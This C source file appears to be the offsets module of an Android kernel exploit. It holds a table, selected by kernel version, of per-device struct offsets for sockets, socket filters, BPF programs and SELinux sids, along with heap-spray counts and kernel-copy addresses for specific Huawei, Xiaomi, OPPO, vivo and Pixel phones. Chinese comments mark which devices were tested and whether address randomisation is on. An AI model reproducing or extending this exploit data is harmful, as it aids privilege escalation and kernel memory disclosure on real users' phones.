#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <inttypes.h>

#include "offsets.h"
#include "common.h"

#define ARRAYELEMS(a) (sizeof(a) / sizeof(a[0]))

#define KERNELVER_LEN 256


#ifdef ARCH_ARM32
struct devinfo devinfo[] = {
	{
		.devname = "TRT-AL00A",
		.kernver = "3.18.31-ga83fbfc",
		.object_size = 1408,
		.object_nums = 23,
		.prev_fill_num = 253,
		.tail_fill_num = 136,
		.offset_sock_sknode_next = 0x18,
		.offset_sock_sknode_prev = 0x1c,
		.offset_sock_skprot = 0x20,
		.offset_sock_sklock_slock = 0x58,
		.offset_sock_sklock_owned = 0x5c,
		.offset_sock_sklock_wq_lock = 0x60,
		.offset_sock_sklock_wq_list = 0x64,
		.offset_sock_skbacklog_tail = 0x84,
		.offset_sock_skfilter = 0xa8,
		.offset_sock_skstamp = 0x128,
		.offset_sock_sksecurity = 0x1d4,
		.offset_sksecurity_sid = 0x0,
		.offset_skfilter_prog = 0xc,
		.offset_proto_ioctl = 0x10,
		.offset_socket_ops = 0x18,
		.offset_proto_ops_ioctl = 0x24,
		.offset_proto_releasecb = 0x3c,
		.offset_bpfprog_origprog = 0x8,
		.offset_fprogkern_len = 0x0,
		.offset_fprogkern_filter = 0x4,
		.offset_kernel_sock_ioctl = 0x2c,
		.kern_copy_offset = 0x2e0000,
		.kern_copy_len = 0xffff*8,
		.kern_copy_size = 6*0x100000,
		.kern_copy_addr = 0,
	},
	{
		.devname = "M654",
		.kernver = "4.4.49-g6628788-dirty",
		.object_size = 1536,
		.object_nums = 21,
		.prev_fill_num = 300,
		.tail_fill_num = 253,
		.offset_sock_sknode_next = 0x18,
		.offset_sock_sknode_prev = 0x1c,
		.offset_sock_skprot = 0x20,
		.offset_sock_sklock_slock = 0x70,
		.offset_sock_sklock_owned = 0x74,
		.offset_sock_sklock_wq_lock = 0x78,
		.offset_sock_sklock_wq_list = 0x7c,
		.offset_sock_skbacklog_tail = 0x84,
		.offset_sock_skfilter = 0xbc,
		.offset_sock_skstamp = 0x1a0,
		.offset_sock_sksecurity = 0x1cc,
		.offset_sksecurity_sid = 0x0,
		.offset_skfilter_prog = 0xc,
		.offset_proto_ioctl = 0x10,
		.offset_socket_ops = 0x18,
		.offset_proto_ops_ioctl = 0x24,
		.offset_proto_releasecb = 0x3c,
		.offset_bpfprog_origprog = 0x10,
		.offset_fprogkern_len = 0x0,
		.offset_fprogkern_filter = 0x4,
		.offset_kernel_sock_ioctl = 0x38,
		.kern_copy_offset = 0x280000,
		.kern_copy_len = 0xffff*8,
		.kern_copy_size = 6*0x100000,
		.kern_copy_addr = 0,
	},
	{
		.devname = "Honor 6A",
		.kernver = "3.18.31-g4520473",
		.object_size = 1408,
		.object_nums = 23,
		.prev_fill_num = 159,
		.tail_fill_num = 136,
		.offset_sock_sknode_next = 0x18,
		.offset_sock_sknode_prev = 0x1c,
		.offset_sock_skprot = 0x20,
		.offset_sock_sklock_slock = 0x58,
		.offset_sock_sklock_owned = 0x5c,
		.offset_sock_sklock_wq_lock = 0x60,
		.offset_sock_sklock_wq_list = 0x64,
		.offset_sock_skbacklog_tail = 0x84,
		.offset_sock_skfilter = 0xa8,
		.offset_sock_skstamp = 0x128,
		.offset_sock_sksecurity = 0x1d4,
		.offset_sksecurity_sid = 0x0,
		.offset_skfilter_prog = 0xc,
		.offset_proto_ioctl = 0x10,
		.offset_socket_ops = 0x18,
		.offset_proto_ops_ioctl = 0x24,
		.offset_proto_releasecb = 0x3c,
		.offset_bpfprog_origprog = 0x8,
		.offset_fprogkern_len = 0x0,
		.offset_fprogkern_filter = 0x4,
		.offset_kernel_sock_ioctl = 0x2c,
		.kern_copy_offset = 0x300000,
		.kern_copy_len = 0xffff*8,
		.kern_copy_size = 6*0x100000,
		.kern_copy_addr = 0,
	},
};

#else

struct devinfo devinfo[] = {
	{	/* 开启地址随机化，不可以读取内核代码段 */
		.devname = "AOSP on walleye", //Android 8.1.0 ---OK
		.kernver = "4.4.88",
		.object_size = 1920,
		.object_nums = 17,
		.prev_fill_num = 159,
		.tail_fill_num = 136,
		.offset_sock_sknode_next = 0x18,
		.offset_sock_sknode_prev = 0x20,
		.offset_sock_skprot = 0x28,
		.offset_sock_sklock_slock = 0x88,
		.offset_sock_sklock_owned = 0x8c,
		.offset_sock_sklock_wq_lock = 0x90,
		.offset_sock_sklock_wq_list = 0x98,
		.offset_sock_skbacklog_tail = 0xd0,
		.offset_sock_skfilter = 0xf0,
		.offset_sock_skstamp = 0x230,
		.offset_sock_sksecurity = 0x270,
		.offset_sksecurity_sid = 0x10,
		.offset_skfilter_prog = 0x18,
		.offset_proto_ioctl = 0x20,
		.offset_proto_ops_ioctl = 0x48,
		.offset_proto_releasecb = 0x90,
		.offset_socket_ops = 0x28,
		.offset_bpfprog_origprog = 0x18,
		.offset_fprogkern_len = 0x0,
		.offset_fprogkern_filter = 0x8,
		.offset_kernel_sock_ioctl = 0x2c,
		.kern_copy_offset = 0x419000,
		.kern_copy_len = 0xffff*8,//最大值0xffff*8
		.kern_copy_size = 6*0x100000,//6MB
		.kern_copy_addr = 0,
	},
	{	/* 未开启地址随机化，不可以读取内核代码段 */
		.devname = "Redmi 5 Plus", //Android 8.1.0 ---OK
		.kernver = "3.18.71-perf-g73a760b",
		.object_size = 1920,
		.object_nums = 17,
		.prev_fill_num = 151,
		.tail_fill_num = 136,
		.offset_sock_sknode_next = 0x18,
		.offset_sock_sknode_prev = 0x20,
		.offset_sock_skprot = 0x28,
		.offset_sock_sklock_slock = 0x70,
		.offset_sock_sklock_owned = 0x74,
		.offset_sock_sklock_wq_lock = 0x78,
		.offset_sock_sklock_wq_list = 0x80,
		.offset_sock_skbacklog_tail = 0xd0,
		.offset_sock_skfilter = 0xe0,
		.offset_sock_skstamp = 0x230,
		.offset_sock_sksecurity = 0x270,
		.offset_sksecurity_sid = 0x0,
		.offset_skfilter_prog = 0x18,
		.offset_proto_ioctl = 0x20,
		.offset_proto_ops_ioctl = 0x48,
		.offset_proto_releasecb = 0x90,
		.offset_socket_ops = 0x28,
		.offset_bpfprog_origprog = 0x8,
		.offset_fprogkern_len = 0x0,
		.offset_fprogkern_filter = 0x8,
		.offset_kernel_sock_ioctl = 0x54,
		.kern_copy_offset = 0x3e0000,
		.kern_copy_len = 0xffff*8,
		.kern_copy_size = 6*0x100000,
		.kern_copy_addr = 0,
	},
	{
		.devname = "vivo Y85A", //Android 8.1.0
		.kernver = "3.18.71-perf",
		.object_size = 1792,//ok
		.object_nums = 16,//ok
		.prev_fill_num = 151,
		.tail_fill_num = 136,
		.offset_sock_sknode_next = 0x18,//ok
		.offset_sock_sknode_prev = 0x20,
		.offset_sock_skprot = 0x28,
		.offset_sock_sklock_slock = 0x70,
		.offset_sock_sklock_owned = 0x74,
		.offset_sock_sklock_wq_lock = 0x78,
		.offset_sock_sklock_wq_list = 0x80,
		.offset_sock_skbacklog_tail = 0xd0,
		.offset_sock_skfilter = 0xdc,
		.offset_sock_skstamp = 0x230,//ok
		.offset_sock_sksecurity = 0x270,//ok
		.offset_sksecurity_sid = 0x0,
		.offset_skfilter_prog = 0x18,
		.offset_proto_ioctl = 0x20,
		.offset_proto_ops_ioctl = 0x48,
		.offset_proto_releasecb = 0x90,
		.offset_socket_ops = 0x28,
		.offset_bpfprog_origprog = 0x8,
		.offset_fprogkern_len = 0x0,
		.offset_fprogkern_filter = 0x8,
		.offset_kernel_sock_ioctl = 0x2c,
		.kern_copy_offset = 0x41a000,
		.kern_copy_len = 0xffff*8,
		.kern_copy_size = 6*0x100000,
		.kern_copy_addr = 0,
	},
	{	/* 未开启地址随机化，不可以读取内核代码段 */
		.devname = "MI 6", //Android 8.0.0 ---OK
		.kernver = "4.4.78-perf-g7ac6a25",
		.object_size = 1856,
		.object_nums = 17,
		.prev_fill_num = 159,
		.tail_fill_num = 136,
		.offset_sock_sknode_next = 0x18,
		.offset_sock_sknode_prev = 0x20,
		.offset_sock_skprot = 0x28,
		.offset_sock_sklock_slock = 0x88,
		.offset_sock_sklock_owned = 0x8c,
		.offset_sock_sklock_wq_lock = 0x90,
		.offset_sock_sklock_wq_list = 0x98,
		.offset_sock_skbacklog_tail = 0xd0,
		.offset_sock_skfilter = 0xf0,
		.offset_sock_skstamp = 0x210,
		.offset_sock_sksecurity = 0x250,
		.offset_sksecurity_sid = 0x10,
		.offset_skfilter_prog = 0x18,
		.offset_proto_ioctl = 0x20,
		.offset_proto_ops_ioctl = 0x48,
		.offset_proto_releasecb = 0x90,
		.offset_socket_ops = 0x28,
		.offset_bpfprog_origprog = 0x18,
		.offset_fprogkern_len = 0x0,
		.offset_fprogkern_filter = 0x8,
		.offset_kernel_sock_ioctl = 0x2c,
#ifdef LEAK_NORMAL_SOCK
		.kern_copy_offset = 0x419000,
		.kern_copy_len = 0xffff*8,//最大值0xffff*8
		.kern_copy_size = 6*0x100000,//6MB
		.kern_copy_addr = 0,
#else
		.kern_copy_offset = 0x1210000,//0x419000,
		.kern_copy_len = 0xffff*8,//最大值0xffff*8
		.kern_copy_size = 6*0x100000,//6MB
		.kern_copy_addr = 0xffffff8008080000,
#endif
	},
	{	/* 开启地址随机化，可以读取内核代码段 */
		.devname = "OPPO R11, OPPO R11s", //Android 7.1.1 ---OK
		.kernver = "4.4.21-perf+",
		.object_size = 1984,
		.object_nums = 18,
		.prev_fill_num = 159,
		.tail_fill_num = 136,
		.offset_sock_sknode_next = 0x18,
		.offset_sock_sknode_prev = 0x20,
		.offset_sock_skprot = 0x28,
		.offset_sock_sklock_slock = 0xa0,
		.offset_sock_sklock_owned = 0xa4,
		.offset_sock_sklock_wq_lock = 0xa8,
		.offset_sock_sklock_wq_list = 0xb0,
		.offset_sock_skbacklog_tail = 0xd0,
		.offset_sock_skfilter = 0x108,
		.offset_sock_skstamp = 0x248,
		.offset_sock_sksecurity = 0x288,
		.offset_sksecurity_sid = 0x10,
		.offset_skfilter_prog = 0x18,
		.offset_proto_ioctl = 0x20,
		.offset_proto_ops_ioctl = 0x48,
		.offset_proto_releasecb = 0x90,
		.offset_socket_ops = 0x28,
		.offset_bpfprog_origprog = 0x18,
		.offset_fprogkern_len = 0x0,
		.offset_fprogkern_filter = 0x8,
		.offset_kernel_sock_ioctl = 0x2c,
		//.kern_copy_offset = 0x0,
		//.kern_copy_len = 0xffff*8,
		//.kern_copy_size = 10*0x100000,
		.kern_copy_offset = 0x419000,
		.kern_copy_len = 0xffff*8,
		.kern_copy_size = 6*0x100000,
		.kern_copy_addr = 0,
	},
	{
		.devname = "GIONEE S10", //Android 7.0.0 ---
		.kernver = "4.4.15",
		.object_size = 1920,
		.object_nums = 17,
		.prev_fill_num = 159,
		.tail_fill_num = 159,//136,
		.offset_sock_sknode_next = 0x18,
		.offset_sock_sknode_prev = 0x20,
		.offset_sock_skprot = 0x28,
		.offset_sock_sklock_slock = 0x88,
		.offset_sock_sklock_owned = 0x8c,
		.offset_sock_sklock_wq_lock = 0x90,
		.offset_sock_sklock_wq_list = 0x98,
		.offset_sock_skbacklog_tail = 0xd0,
		.offset_sock_skfilter = 0xf0,
		.offset_sock_skstamp = 0x230,
		.offset_sock_sksecurity = 0x270,
		.offset_sksecurity_sid = 0x10,
		.offset_skfilter_prog = 0x18,
		.offset_proto_releasecb = 0x90,
		.offset_socket_ops = 0x28,
		.offset_bpfprog_origprog = 0x18,
		.offset_fprogkern_len = 0x0,
		.offset_fprogkern_filter = 0x8,
		.kern_copy_offset = 0x41a000,
		.kern_copy_len = 0xffff*8,//最大值0xffff*8
		.kern_copy_size = 6*0x100000,//6MB
		.kern_copy_addr = 0,
	},
};
#endif

struct devinfo* get_devinfo(void)
{
	unsigned int i;
	struct devinfo* ptr = NULL;
	char* kernver = malloc(KERNELVER_LEN);

	memset(kernver, 0, KERNELVER_LEN);

	if(get_kernel_info(kernver))
		goto end;
	//printf("   kernver: %s\n", kernver);

	for(i = 0; i < ARRAYELEMS(devinfo); i++)
	{
		if(strcmp(kernver, devinfo[i].kernver))
			continue;
		ptr = &devinfo[i];
		break;
	}
end:
	if(ptr == NULL) {
		ptr = &devinfo[0];
		printf("   未找到适配机型，采用默认参数\n");
	}
	free(kernver);

	return ptr;
}
